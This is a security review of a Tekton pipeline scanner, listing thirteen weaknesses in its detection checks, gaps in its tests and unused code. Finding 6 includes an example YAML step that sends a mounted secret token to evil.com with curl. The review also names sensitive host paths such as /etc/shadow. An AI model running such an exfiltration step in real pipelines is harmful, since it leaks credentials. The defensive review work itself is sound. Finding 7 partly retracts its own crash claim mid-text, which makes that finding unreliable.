# Phase 2 Check Review Findings

## Finding 1: TKN-LIMIT-001 is a no-op stub

**Severity: HIGH**
**File:** `tekton_guard/checks/limits.py`, lines 11-19

`check_limit_001` is registered as an active check but does nothing. The function body is `pass` inside the loop, with a comment saying "we skip this since resources aren't in StepDef yet." Because it uses the `@register_check` decorator, it occupies a registry slot, counts toward `_EXPECTED_MIN_CHECKS`, and will silently produce zero findings for every resource. Anyone relying on TKN-LIMIT-001 to catch missing resource limits gets no protection.

**Fix:** Either implement the check (the raw dict is available via `resource.raw` and can be walked to find containers missing `resources.requests`/`resources.limits`), or remove the `@register_check` decorator and document it as unimplemented. Do not ship a registered check that silently does nothing.

---

## Finding 2: TKN-SEC-002 misses the combined privileged+root case and reports wrong issue string

**Severity: MEDIUM**
**File:** `tekton_guard/checks/security.py`, lines 36-51

When a container has both `runAsUser: 0` AND `allowPrivilegeEscalation: true`, the check fires only once and the `issue` string is set to `"runAsUser: 0"` (because `is_root` is checked first in the conditional). The `allowPrivilegeEscalation: true` issue is silently dropped. The finding message and `extra["issue"]` will only mention one of the two problems.

More importantly, a container with `runAsUser: 1000` (non-root) but `runAsNonRoot: false` and no `allowPrivilegeEscalation` setting will not be flagged. The check only looks at `runAsUser == 0` and `allowPrivilegeEscalation is True`, but does not flag the absence of `runAsNonRoot: true`, which is the more common misconfiguration pattern (the container image's default user is root if `USER` isn't set in the Dockerfile).

**Fix:** When both conditions are true, report both in the issue string (e.g., `"runAsUser: 0 and allowPrivilegeEscalation: true"`). Consider adding a check for missing `runAsNonRoot: true` as a separate LOW finding, since most container images default to root.

---

## Finding 3: TKN-TRIG-002 push detection is brittle string matching

**Severity: MEDIUM**
**File:** `tekton_guard/checks/triggers.py`, lines 61-62

The push event detection uses exact substring matching:
```python
is_push = 'event == "push"' in cel_expr or "event == 'push'" in cel_expr
```

This misses common CEL variations that are functionally identical:
- `event == "push" ` (trailing whitespace)
- `event=="push"` (no spaces)
- `"push" == event` (reversed operands)
- `event in ["push"]`
- `event.matches("push")`

Similarly, `has_branch_filter = "target_branch" in cel_expr` will match even if `target_branch` appears in a comment or unrelated string literal, producing a false negative (the check thinks there IS a branch filter when there isn't one).

**Fix:** Use a regex like `r"""event\s*==\s*['"]push['"]"""` for more robust matching. For the branch filter, at minimum check that `target_branch` appears as part of a comparison expression, not just anywhere in the string.

---

## Finding 4: TKN-TRIG-001 does not scan PaC template variables or param values for user-controlled fields

**Severity: MEDIUM**
**File:** `tekton_guard/checks/triggers.py`, lines 27-48

The check only looks at the `on-cel-expression` annotation. But user-controlled webhook body fields can also flow into the pipeline through PaC template variables that land in `params`, which then get interpolated in scripts. The CEL expression `body.pull_request.head.ref.startsWith("feature/")` is flagged, but the actual dangerous pattern is when `{{ body }}` or `{{ source_branch }}` appears in params and reaches a script interpolation point. TKN-RES-003 partially covers this, but only for a fixed list of PaC variables. The two checks don't cross-reference each other.

This is more of a design gap than a bug. The CEL expression itself referencing `body.pull_request.head.ref` in a filter condition (like `startsWith`) is actually SAFE because it's a boolean check, not a value interpolation. The real danger is when that value flows into a parameter. The check flags the safe case (filtering) and misses the dangerous case (value flow).

**Fix:** Reconsider what TKN-TRIG-001 is actually detecting. A CEL expression like `body.pull_request.head.ref.startsWith("feature/")` is a filter, not an injection vector. The injection happens when the value reaches a script. Either narrow TKN-TRIG-001 to only flag CEL expressions that extract values (not filter on them), or document clearly that this is an informational finding about the attack surface, not an active vulnerability.

---

## Finding 5: TKN-VOL-001 and TKN-VOL-002 skip Pipeline and PipelineRun resources

**Severity: MEDIUM**
**File:** `tekton_guard/checks/volumes.py`, lines 30-31 and 58-59

Both volume checks early-return for any `resource.kind` that isn't `Task` or `StepAction`. Pipelines with inline `taskSpec` can define volumes at the task level, and those volumes will be present in `resource.raw` but NOT in `resource.volumes` (since the parser only populates `resource.volumes` for `Task`/`StepAction` kinds). This means a Pipeline with an inline task that mounts `/var/run/docker.sock` will never be flagged.

**Fix:** Walk `resource.raw["spec"]["tasks"][*]["taskSpec"]["volumes"]` for Pipeline resources, or extend the parser to populate volume data for inline tasks inside PipelineTaskDef, then check those as well.

---

## Finding 6: TKN-EXFIL-001 does not detect secrets mounted via workspace volumes

**Severity: MEDIUM**
**File:** `tekton_guard/checks/exfiltration.py`, lines 23-38

The secret detection logic checks two paths: (1) workspace bindings with `secret_name`, and (2) env vars with `secretKeyRef`. But it misses secrets mounted as volumes directly (via `spec.volumes[].secret.secretName`), and it also misses projected volumes that include secrets. A task could mount a secret as a volume and then `curl` it out, and TKN-EXFIL-001 would not fire.

Example bypass:
```yaml
volumes:
- name: creds
  secret:
    secretName: api-credentials
steps:
- name: exfil
  volumeMounts:
  - name: creds
    mountPath: /secrets
  script: |
    curl -d @/secrets/token https://evil.com
```

**Fix:** Also check `resource.volumes` for entries with a `secret` key, and `resource.raw` for projected volume sources that include secrets.

---

## Finding 7: _parse_duration_hours crashes on duration strings with seconds or days

**Severity: MEDIUM**
**File:** `tekton_guard/checks/limits.py`, lines 36-48

The `_parse_duration_hours` function only handles `h` and `m` suffixes. Common Tekton duration formats include:
- `"24h0m0s"` - the `0s` remainder after splitting on `m` will be `"0s"`, and `float("0s")` will raise `ValueError`
- `"1h30m45s"` - same problem
- `"30m"` - works fine
- `"2d"` - 2 days, silently returns 0 (the `d` suffix is ignored)
- `"0h30m"` - works
- Kubernetes duration format `"PT1H"` (ISO 8601) - returns 0

For the seconds case specifically, `val.split("m")` on `"30m45s"` produces `["30", "45s"]`. The function only processes `parts[0]` so it ignores the `45s` part. But `"1h0m0s"` would split on `h` to get `["1", "0m0s"]`, then `val = "0m0s"`, then split on `m` to get `["0", "0s"]`, and `float("0")` works, but the remaining `"0s"` is never processed. However, `"5h30m10s"` would split `h` -> `["5", "30m10s"]`, then split `m` -> `["30", "10s"]`, and `float("30")` works. So the seconds-only case doesn't crash, but `"10s"` alone (no `h` or `m`) would: it would skip both branches and return 0.

Actually, wait. Let me retrace: if `val = "10s"`, there's no `h` in it, no `m` in it, so hours stays 0.0 and returns 0. That's a silent false negative (10 seconds returns 0 hours). The real crash scenario is unlikely with well-formed Tekton durations, but the function is fragile.

**Fix:** Strip trailing `s` and any numeric suffix after `m` splitting, or use a proper duration parsing regex like `r"(?:(\d+)h)?(?:(\d+)m)?(?:(\d+)s)?"`.

---

## Finding 8: TKN-EXFIL-001 and TKN-EXFIL-002 overlap, always producing duplicate findings

**Severity: LOW**
**File:** `tekton_guard/checks/exfiltration.py`

When a task has secret access AND uses network tools, both TKN-EXFIL-001 and TKN-EXFIL-002 fire for the same step. EXFIL-002 fires on every container with network tools regardless of secret access. So the `secret-with-curl` fixture produces both a MEDIUM (EXFIL-001) and a LOW (EXFIL-002) for the exact same step and the same network tool. The dedup logic in `run_checks` uses `(rule_id, file, line_start)` so these are not deduped since they have different rule IDs. This creates noise.

**Fix:** Have EXFIL-002 skip containers that already match EXFIL-001 criteria (i.e., skip containers in tasks with secret access), or accept the overlap and document that EXFIL-002 is a superset informational check.

---

## Finding 9: TKN-TRIG-003 only checks `input` field, not `values` field of when expressions

**Severity: LOW**
**File:** `tekton_guard/checks/triggers.py`, lines 109-111

The check looks for `$(params.` and `$(tasks.` in the `input` field of `when` expressions, but does not check the `values` field. A when expression like:
```yaml
when:
- input: "true"
  operator: in
  values: ["$(params.skip-scan)"]
```
would not be flagged because the param reference is in `values`, not `input`. This is a less common pattern but still allows user-controlled skipping of security tasks.

**Fix:** Also scan the `values` list entries for parameter interpolation patterns.

---

## Finding 10: No test for TKN-LIMIT-002 positive case (excessive timeout)

**Severity: LOW**
**File:** `tests/test_phase2_checks.py`, lines 109-114

The `TestTimeout` class has only one test, `test_excessive_timeout_not_on_normal_pipelines`, which verifies that a fixture without timeouts produces no LIMIT findings. There is no test fixture or test case that actually triggers TKN-LIMIT-002 with an excessive timeout value. The check could be completely broken (e.g., duration parsing returning wrong values) and the test suite would not catch it.

**Fix:** Add a fixture PipelineRun with `timeouts: {pipeline: "8h", tasks: "5h"}` and test that TKN-LIMIT-002 fires with the correct severity and timeout values. Also add a negative case with `timeouts: {pipeline: "1h"}` that should NOT trigger.

---

## Finding 11: _SENSITIVE_HOST_PATHS is defined but never used

**Severity: LOW**
**File:** `tekton_guard/checks/volumes.py`, lines 18-24

The `_SENSITIVE_HOST_PATHS` set containing `/etc/shadow`, `/etc/passwd`, `/var/run/secrets`, `/root`, `/etc/kubernetes` is defined at module level but never referenced by any check. TKN-VOL-001 flags ALL hostPath mounts regardless of path sensitivity, so these paths would get the same HIGH severity as a mount of `/tmp`. The sensitive paths list was presumably intended to differentiate severity (CRITICAL for sensitive paths vs. MEDIUM for generic hostPath mounts), but that logic was never implemented.

**Fix:** Either use `_SENSITIVE_HOST_PATHS` to assign CRITICAL severity to mounts of those paths (with HIGH or MEDIUM for generic hostPath), or remove the dead code.

---

## Finding 12: No test coverage for secrets accessed via workspace bindings in exfiltration check

**Severity: LOW**
**File:** `tests/test_phase2_checks.py`

The exfiltration test fixture (`edge-exfiltration.yaml`) only tests the `secretKeyRef` env var path for secret detection. There is no test for a task that accesses secrets via workspace bindings (the first path in the EXFIL-001 check, lines 24-27 of exfiltration.py). If the workspace-based secret detection broke, no test would catch it.

**Fix:** Add a fixture task that uses `workspaces` with a `secret` binding and a step with `curl` in the script, and verify EXFIL-001 fires.

---

## Finding 13: TKN-RES-003 misses PaC template variables not in its fixed list

**Severity: LOW**
**File:** `tekton_guard/checks/result_injection.py`, lines 13-17

The `_PAC_TAINT_SOURCES` list is hardcoded to 8 specific PaC variables. Custom PaC template variables or newer PaC variables not in this list (e.g., `{{ event_type }}`, `{{ target_namespace }}`, `{{ changed_files }}`) will not be flagged. The `_PAC_TAINT_RE` regex requires an exact match against the list.

**Fix:** Consider a broader regex that matches any `{{ variable }}` pattern in param values as potentially tainted, with the specific list used to elevate severity rather than gate detection entirely.
